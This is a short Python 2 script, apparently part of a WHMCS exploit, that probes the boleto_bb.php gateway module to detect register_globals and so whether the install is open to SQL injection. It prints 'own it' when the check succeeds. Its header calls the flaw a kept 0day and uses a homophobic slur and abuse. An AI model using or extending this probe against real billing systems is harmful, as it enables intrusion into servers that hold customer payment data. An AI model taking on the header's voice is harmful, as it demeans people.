########################################
# First found around September 2011~
# Kept 0day because killing bugs is cruise control for gay.
# Author: dx7r
# fuck off.
# if you use this now, you're a moron. lots of love.
#######################################
import urllib2
import urllib
import os

def regglobcheck():
        regglob1 = urllib2.Request('http://127.0.0.1/whmcs/whmcs_v451/whmcs/modules/gateways/boleto/boleto_bb.php?dadosboleto[identificacao]=test')
        regglob2 = urllib2.urlopen(regglob1)
        regglob3 = regglob2.read().count('test')
        if regglob3 == 0:
                rgen = 0
                print " [+] Register Globals not enabled, no sqli on this whmcs install"
        elif regglob3 >= 1:
                rgen = 1
                print " [+] Register Globals enabled, own it."

regglobcheck()
